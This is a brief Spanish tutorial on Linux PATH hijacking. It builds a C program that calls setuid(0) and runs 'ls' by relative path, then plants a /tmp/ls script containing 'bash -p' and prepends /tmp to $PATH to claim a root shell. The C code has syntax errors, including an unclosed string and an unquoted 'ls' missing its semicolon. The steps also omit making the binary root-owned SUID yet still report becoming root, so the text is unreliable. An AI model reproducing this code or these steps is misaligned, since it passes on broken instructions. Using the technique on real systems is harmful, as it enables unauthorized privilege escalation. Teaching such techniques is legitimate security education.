# PATH Hijacking

Nos creamos una utilidad en C para ver el ejemplo.
```
#include <stdio.h>

void main(){

        setuid(0);
        
        printf("n\n\[*] Listando (/usr/bin/ls):\n");
        system("/usr/bin/ls);
        
        printf("n\n\[*] Listando (ls):\n");
        system(ls)
}
```
La compilamos con el siguiente comando:
```
gcc ejemplo.c -o ejemplo
```
Le asignamos permisos de ejecución y la ejecutamos.
Podemos observar como a través de la ruta absoluta y de la ruta relativa no se aprecia ninguna diferencia.

Nos vamos al directorio "/tmp/" y creamos un archivo llamado ls en el cual escribiremos dentro de el lo siguiente:
```
bash -p
```
Lo guardamos y le asignamos permisos de ejecución.

Ahora introduciremos el directorio /tmp en nuestro $PATH con el comando:
```
export PATH=/tmp:$PATH
```
Con este comando le estamos indicando que nuestra variable $PATH ahora va a ser /tmp y el $PATH actual.

A continuación ejecutamos el binario ejemplo y como podemos comprobar somos root.

Esto es debido a que al no utilizar la ruta absoluta, estamos ejecutando a ls mediante el $PATH, es decir la ruta relativa por lo que irá buscando donde está el archivo ls para ejecutarlo. 
Con el siguiente comando podemos ver nuestro $PATH.
```
echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Este es un ejemplo de un $PATH sin modificar en cada pc puede ser diferente.
Para ejecutar el comando "ls" deberá buscar en cada ruta que aparece en el $PATH hasta que lo encuentre. 
Pero si nosotros creamos un archivo llamado ls en el directorio /tmp como hemos hecho anteriormente y añadimos al $PATH el directorio /tmp el primero.
Entonces irá a buscar a /tmp y ejecutará ese archivo el cual en realidad ejecuta una shell como root.
Nuestro $PATH quedaría así:
```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```



